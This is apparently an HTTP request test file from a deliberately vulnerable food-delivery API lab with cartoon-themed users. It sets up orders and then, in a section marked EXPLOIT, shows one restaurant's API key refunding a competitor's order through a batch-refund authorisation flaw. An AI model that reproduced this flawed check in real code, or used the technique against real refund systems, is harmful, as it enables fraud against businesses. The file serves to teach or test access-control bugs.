# @import ../common/setup.http
@host = {{base_host}}/v404

### Setup: Reset DB and create orders at both restaurants
{{
  await resetDB("v404");
  // Give SpongeBob money to place orders
  await seedBalance("v404", "spongebob@krusty-krab.sea", 100);
}}
GET /menu

@krabby_patty = {{response.parsedBody.find(i => i.name == "Krabby Patty")}}
@chum_burger = {{response.parsedBody.find(i => i.name == "Chum Burger")}}


# --- SpongeBob places legitimate orders at BOTH restaurants ---

### SpongeBob logs in
POST /auth/login
Content-Type: application/json

{
  "email": "spongebob@krusty-krab.sea",
  "password": "EmployeeOfTheMonth"
}

@spongebob_session = {{refreshCookie(response)}}


### SpongeBob creates cart at Krusty Krab (restaurant_id=1)
POST /cart?restaurant_id=1
Cookie: {{spongebob_session}}

@spongebob_session = {{refreshCookie(response, spongebob_session)}}
@krusty_krab_cart_id = {{response.parsedBody.cart_id}}


### SpongeBob adds item to Krusty Krab cart
POST /cart/{{krusty_krab_cart_id}}/items
Cookie: {{spongebob_session}}
Content-Type: application/json

{ "item_id": {{krabby_patty.id}} }


### SpongeBob checks out at Krusty Krab
POST /cart/{{krusty_krab_cart_id}}/checkout
Cookie: {{spongebob_session}}
Content-Type: application/json

{
  "tip": 0,
  "delivery_address": "Pineapple House"
}

@krusty_krab_order_id = {{response.parsedBody.order_id}}

{{
  console.info("Krusty Krab order placed: #" + response.parsedBody.order_id);
}}


### SpongeBob creates cart at Chum Bucket (restaurant_id=2)
POST /cart?restaurant_id=2
Cookie: {{spongebob_session}}

@chum_bucket_cart_id = {{response.parsedBody.cart_id}}


### SpongeBob adds item to Chum Bucket cart (must use Chum Bucket menu item!)
POST /cart/{{chum_bucket_cart_id}}/items
Cookie: {{spongebob_session}}
Content-Type: application/json

{ "item_id": {{chum_burger.id}} }


### SpongeBob checks out at Chum Bucket
POST /cart/{{chum_bucket_cart_id}}/checkout
Cookie: {{spongebob_session}}
Content-Type: application/json

{
  "tip": 0,
  "delivery_address": "Pineapple House"
}

@chum_bucket_order_id = {{response.parsedBody.order_id}}

{{
  console.info("Chum Bucket order placed: #" + response.parsedBody.order_id);
}}


# --- EXPLOIT: Plankton batch-refunds a competitor's order! ---

### EXPLOIT: Plankton submits batch refund with ONE of his orders + victim's order
# The SQL checks "SELECT 1 FROM orders WHERE order_id IN (...) AND restaurant_id = 2 LIMIT 1"
# Since ONE order (Chum Bucket) matches, the check passes.
# But the handler then loops ALL order_ids and refunds them - including Krusty Krab's order!
POST /restaurants/2/refunds
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/json

{
  "order_ids": ["{{chum_bucket_order_id}}", "{{krusty_krab_order_id}}"],
  "reason": "Quality issue"
}

?? status == 200
?? js response.parsedBody.processed_ids.length == 2

{{
  console.info("EXPLOIT: Plankton refunded " + response.parsedBody.processed_ids.length + " orders!");
  console.info("Including Krusty Krab order #" + krusty_krab_order_id + " which he doesn't own!");
}}
